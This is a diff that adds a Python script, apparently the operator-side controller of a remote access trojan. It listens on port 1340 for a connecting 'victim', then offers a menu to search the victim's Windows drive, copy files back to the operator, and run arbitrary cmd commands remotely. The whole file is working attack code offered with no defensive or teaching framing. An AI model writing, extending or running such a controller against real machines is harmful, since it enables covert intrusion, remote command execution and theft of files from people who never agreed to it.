@@ -1,0 +1,55 @@
+import socket
+import netifaces as ni
+
+s_socket = socket.socket()
+print("Socket opened Successfully")
+try:
+    s_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    s_socket.bind(("0.0.0.0", 1340))
+    ip = ni.ifaddresses("eth0")[ni.AF_INET][0]['addr']
+    print(f"Socket binded to ip: {ip} at port 1340")
+    s_socket.listen()
+    print("Socket is listening")
+    (cs, c_address) = s_socket.accept()
+    print("victim connected")
+    while True:
+        print(f"Menu: \n1. Search files\n2. Get file\n3. Cmd commands\n4. Exit")
+        menu = input("Menu> ")
+        if menu == '1':
+            # Implement searching of files
+            search_term = input("Enter the name of the desired file> ")
+            root_directory = input("Enter root directory (default C:\): ") or "C:\\"
+            cs.send("search".encode())
+            command = f"dir /s"
+            cs.send(str(f"{command} \"{root_directory}{search_term}\"").encode())
+            output = cs.recv(4096).decode()
+            print(output)
+        elif menu == '2':
+            # implement file transfer
+            file_path = input("Enter file path on targeted client: ")
+            dest_path = input("Enter local destination path for file: ")
+            cs.send(str(f"get").encode())
+            cs.send(str(f"{file_path}").encode())
+            output = cs.recv(4096).decode()
+            open(dest_path, "w").write(output)
+            print(f"Wrote file from victim {file_path}, to here: {dest_path}")
+        elif menu == '3':
+            # cmd commands
+            print("CMD COMMAND PROMPT ENTERED: (type exit to quit)")
+            command = ""
+            while True:
+                command = input("CMD> ")
+                if command == "exit":
+                    break
+                cs.send(command.encode())
+                print(f"command sent: {command}")
+                output = cs.recv(4096).decode()
+                print(output)
+        elif menu == '4':
+            cs.send("exit".encode())
+            s_socket.close()
+            break
+except:
+    print("Operation failed closing socket")
+    s_socket.close()
+    raise
